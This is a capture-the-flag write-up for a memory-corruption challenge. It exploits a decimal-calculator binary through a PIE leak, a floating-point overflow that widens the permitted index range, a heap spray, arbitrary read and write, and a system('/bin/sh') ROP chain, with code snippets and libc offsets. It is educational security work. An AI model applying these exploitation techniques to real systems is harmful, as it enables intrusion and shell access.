# Freal World Manipulation

**Category:** Pwn | **Difficulty:** Medium | **Points:** 122 | **Flag:** `pwnsec{5958381a44ceb597}`

## Challenge Description

> A little flashback to the "Computer Organizations and Architecture" course. But what could go wrong? Well, it's AGI today so 🫩
>
> — @k4tou

## TL;DR

This challenge looks like a harmless decimal-number calculator, but internally it treats array entries as pointers. The exploit is:

1. Use index `-11` to leak a pointer into the PIE binary.
2. Allocate just over 512 MiB of **virtual** memory to pass a “calibration” check.
3. Multiply `1e308 * 1e308`. Both inputs are valid finite doubles, but the product overflows to infinity and makes the program increase its permitted index range enormously.
4. Put a fake pointer table in a large heap allocation.
5. Use that table to turn `view` and `load` into arbitrary read and write operations.
6. Leak libc through the GOT, leak the stack through `environ`, and overwrite a saved return address with a small `system("/bin/sh")` ROP chain.
7. Read the randomly renamed flag file.

The complete solver is in [`exploit.py`](./exploit.py).

---

## Challenge files

The archive contains:

```text
Dockerfile
flag.txt
src/freal
```

The interesting file is `src/freal`, a 64-bit x86 Linux ELF. It is not stripped, so useful function names such as `checked_slot`, `checked_mantissa`, `multiply`, and `store_value` are still present.

The usual protections are enabled:

```text
Architecture: amd64
PIE:          enabled
NX:           enabled
Canary:       enabled
RELRO:        full
```

That means we cannot simply use fixed addresses, execute shellcode on the stack, or overwrite a GOT entry. We first need information leaks and then a code-reuse attack.

The program presents this menu:

```text
1. new decimal
2. load mantissa
3. view mantissa
4. release decimal
5. add decimal
6. multiply decimal
```

In plain English, a “mantissa” here is just the text backing a decimal value. For example, `1e308` is stored in a heap allocation and also converted to a normal C `double` using `strtod`.

---

## How the program stores decimals

Instead of using one C structure per decimal, the program uses several adjacent arrays inside a large global object named `decimal`.

The object begins at PIE offset `0x5060` and roughly looks like this:

| Offset from `decimal` | Contents |
|---:|---|
| `0x0000` | 256 mantissa pointers |
| `0x0800` | 256 allocation sizes |
| `0x1000` | 256 input lengths/precision values |
| `0x1800` | 256 decimal exponents |
| `0x2000` | 256 parsed `double` values |
| `0x2800` | copies of the raw `double` bits |
| `0x3000` | binary64 fraction fields |
| `0x3800` | sign fields |
| `0x3c00` | exponent fields |
| `0x4000` | floating-point class fields |
| `0x4400` | number of created decimals |
| `0x4408` | maximum permitted index |
| `0x4410` | total page-rounded allocation size |

The ELF `_end` symbol is at PIE offset `0x9478`, immediately after this object.

The program starts with a maximum index of `0x100`, exactly the number of legitimate pointer entries. That sounds sensible, but the functions checking indices contain some unusual exceptions.

---

## Bug 1: leaking PIE with index `-11`

The `view` operation eventually calls:

```c
ptr = checked_mantissa(index, 0);
```

Passing zero as the second argument means negative indices are accepted, provided the resulting pointer chain is “coherent.” Here, coherent means the pointers stay within the binary's mapped address range.

There is a convenient self-referential pointer immediately before `decimal`:

```text
__dso_handle offset: 0x5008
decimal offset:      0x5060
difference:          -0x58 bytes
array index:         -0x58 / 8 = -11
```

At runtime, `__dso_handle` points back to itself. Both levels of the pointer chain are therefore inside the PIE mapping, satisfying the checks.

Viewing index `-11` leaks the relocated `__dso_handle` address:

```python
pie = u64(view(-11, 8)) - 0x5008
```

We now know the PIE base despite ASLR.

---

## Bug 2: “calibrating” the checker

Each new decimal may request at most `0x800000` bytes, or 8 MiB. The program asks glibc for the real usable allocation size, rounds it to a page boundary, and adds it to a global counter.

The important test is effectively:

```c
calibrated = total_rounded_allocation_size > 0x1fffffff;
```

`0x1fffffff` is one byte below 512 MiB. Creating 65 objects of 8 MiB each passes that threshold:

```python
for _ in range(65):
    add_decimal(0x800000)
```

This does not immediately consume 520 MiB of physical RAM. The large zeroed allocations are sparse mappings, and the program touches only a tiny part of most of them. Their virtual size still counts toward the program's accounting.

I used 65 rather than the minimum 64 because one allocation will be freed later. The process must remain calibrated after that free.

---

## Bug 3: floating-point overflow expands the index range

The multiplication feature contains the challenge's floating-point trick.

It requires both operands to be finite, normal binary64 numbers. It then checks whether their product is larger than the greatest finite `double`. If so, it replaces the index limit with this allocation-size calculation:

```c
max_index = (left_size >> 4) * (right_size >> 4) * 0x80;
```

The inputs `1e308` and `1e308` are individually valid finite doubles, but their product is too large for binary64:

```text
1e308 * 1e308 = +infinity
```

Using two 8 MiB objects makes the new index limit huge—large enough to describe addresses far beyond the real 256-entry array.

```python
load(0, b"1e308")
load(1, b"1e308")
multiply(0, 1)
```

An index is converted to an address approximately like this:

```c
slot_address = decimal + index * 8;
target_address = *slot_address;
```

If `slot_address` and `target_address` pass the mapping checks, `view` reads from `target_address` and `load` writes to it.

That is close to arbitrary memory access, but there is one more obstacle.

---

## Why a fake pointer table is needed

It is tempting to use pseudo-index `0x400`, because:

```text
decimal + 0x400 * 8 = decimal + 0x2000
```

That lands on the parsed `double` for decimal zero, which is controllable. An exact pointer can even be represented as a subnormal hexadecimal float such as:

```text
0x55aa11223344p-1074
```

Unfortunately, `checked_slot` specifically rejects out-of-bounds slots that fall inside the global `decimal` object. A positive pseudo-slot must be at or beyond `_end`. The controlled `double` field therefore cannot directly become our fake pointer slot.

We need controlled memory outside the binary.

---

## Moving an 8 MiB allocation onto the main heap

The first 8 MiB allocations are created with `mmap`, far away near libc. We know the PIE address but do not yet know libc, so searching from PIE all the way to those mappings would be impractical.

glibc has a helpful optimization called the **dynamic mmap threshold**. When a large mmapped allocation is freed, glibc may increase the size threshold below which future allocations come from the ordinary `brk` heap.

The exploit therefore does this:

1. Create 65 large allocations.
2. Unlock the expanded index range.
3. Free one large mmapped allocation.
4. Request another 8 MiB allocation.

```python
destroy(64)
add_decimal(0x800000)  # new object at index 65
```

The replacement object now comes from the main heap, which is in the same general `0x55...` area as the PIE executable. In the supplied x86-64 environment, it is within the 1 GiB search range used by the solver.

---

## Spraying and finding the fake pointer table

We need a writable scratch qword that `checked_slot` accepts. `_end` itself is perfect:

```text
scratch address = PIE + 0x9478
```

It is at the end of the program object, so it passes the out-of-bounds slot rule, and it lies in mapped zero-filled BSS memory.

The exploit fills the entire new 8 MiB heap allocation with repeated copies of the scratch address:

```python
scratch = pie + 0x9478
spray = p64(scratch) * (0x800000 // 8)
load(65, spray)
```

The allocation is now one enormous fake pointer table:

```text
+----------------------+----------------------+----------------------+
| PIE + 0x9478         | PIE + 0x9478         | PIE + 0x9478         | ...
+----------------------+----------------------+----------------------+
```

Because the allocation is 8 MiB long, testing one address every slightly-less-than-8-MiB guarantees that one candidate lands inside it. This reduces the 1 GiB heap-ASLR search to roughly 129 attempts instead of checking every page.

For each candidate, its pseudo-index is:

```python
index = (candidate - (pie + 0x5060)) // 8
```

If the candidate is unmapped or contains no useful pointer, the service replies `nan`. If it hits the spray, its value points to the zeroed scratch region, so `view` returns 256 zero bytes. This gives us a stable `bootstrap_index` into the fake table.

---

## Converting the bootstrap into arbitrary read/write

The bootstrap entry always contains the scratch address:

```text
*bootstrap_slot = scratch
```

Loading through that entry therefore writes to `scratch`. We use it to place any desired target address in the scratch qword:

```python
load(bootstrap_index, p64(target_address))
```

The scratch qword has a fixed pseudo-index:

```text
(0x9478 - 0x5060) / 8 = 0x883
```

After placing a target pointer in scratch:

- `view(0x883)` reads 256 bytes from the target.
- `load(0x883, data)` writes up to `0x1000` bytes to the target.

In simplified Python:

```python
def set_rw_pointer(address):
    load(bootstrap_index, p64(address))

def arb_read(address):
    set_rw_pointer(address)
    return view(0x883, 0x100)

def arb_write(address, data):
    set_rw_pointer(address)
    load(0x883, data)
```

We now have genuine arbitrary read and arbitrary write.

---

## Leaking libc

Full RELRO makes the GOT read-only, but it does not stop us from reading it.

The GOT entry for `puts` is at PIE offset `0x4f40`. Reading it gives the real libc address of `puts`:

```python
puts = u64(arb_read(pie + 0x4f40)[:8])
libc = puts - 0x80e10
```

The offsets come from the Ubuntu 22.04 libc in the supplied digest-pinned Docker image:

| Item | libc offset |
|---|---:|
| `puts` | `0x80e10` |
| `system` | `0x50d70` |
| `environ` | `0x222200` |
| string `/bin/sh` | `0x1d8678` |
| `pop rdi; ret` | `0x2a3e5` |
| plain `ret` | `0x2a3e6` |

---

## Finding the stack

libc's `environ` variable contains a pointer into the process's initial stack. Reading it reveals a stack address:

```python
environ = u64(arb_read(libc + 0x222200)[:8])
```

The exploit scans downward from this address in 256-byte blocks.

While `view` emits leaked bytes, its saved return address points to PIE offset `0x1475`, the instruction immediately after its call in `main`:

```asm
1470: call view
1475: jmp  main_loop
```

The scanner looks for:

```python
p64(pie + 0x1475)
```

Finding that value reveals the stack address of the command function's saved return pointer.

This is convenient because `load` is called from the same stack depth:

```asm
1480: call load
1485: jmp  main_loop
```

On the next `load`, its saved return address occupies the same stack qword. That gives us a reliable target for the final write.

---

## Final ROP chain

The AMD64 calling convention passes the first function argument in `rdi`. To execute `system("/bin/sh")`, the exploit writes this chain over `load`'s saved return address:

```text
ret
pop rdi; ret
address of "/bin/sh"
address of system
```

In Python:

```python
chain = b"".join([
    p64(libc + 0x2a3e6),  # ret, for alignment
    p64(libc + 0x2a3e5),  # pop rdi; ret
    p64(libc + 0x1d8678), # "/bin/sh"
    p64(libc + 0x50d70),  # system
])
```

The first plain `ret` keeps the stack 16-byte aligned before entering `system`. Without it, libc may crash on alignment-sensitive instructions.

The final arbitrary write happens inside `load` itself. When `load` finishes, it returns through our chain and starts a shell on the same socket.

The Dockerfile renames the flag at startup to:

```text
flag-<random hex>.txt
```

So the shell uses a wildcard:

```sh
cat /home/ctf/flag-*.txt
```

---

## Reproducing locally

Build and start the supplied container:

```bash
cd freal-world-manipulation
docker build -t freal-local .
docker run --rm -d --name freal-test \
  -p 127.0.0.1:9999:9999 freal-local
```

Run the exploit from the parent directory:

```bash
./exploit.py 127.0.0.1 9999
```

Example local result:

```text
[+] PIE base:     0x55911247c000
[*] Calibrating with 65 sparse 8 MiB allocations ...
[+] Out-of-bounds pseudo-indices unlocked
[*] Spraying an 8 MiB main-heap allocation ...
[*] Locating the sprayed heap interval ...
[+] Sprayed slot:  0x55914242c000 (index 0x5ff55f4)
[+] puts:         0x7f1785141e10
[+] libc base:    0x7f17850c1000
[+] environ:      0x7ffd392f32c8
[+] command RIP:  0x7ffd392f3148
[*] Overwriting load() return address with system('/bin/sh') ...
flag{fake_flag}
```

---

## Running remotely

The challenge endpoint uses TLS:

```bash
./exploit.py CHALLENGE_HOST 443 --ssl
```

The successful remote run returned:

```text
pwnsec{5958381a44ceb597}
```

---

## Closing thoughts

The fun part is that no single mistake immediately gives a shell. The exploit builds capabilities one layer at a time:

- a strange negative index leaks PIE;
- memory accounting enables the dangerous path;
- floating-point overflow expands the index limit;
- glibc allocation behavior moves controlled data into a searchable region;
- a sprayed fake pointer bootstraps arbitrary memory access;
- libc and stack leaks finish the job.

Despite the decimal-calculator theme, the real lesson is how integer indexing, floating-point edge cases, ELF layout, heap behavior, and ROP can interact in one exploit.
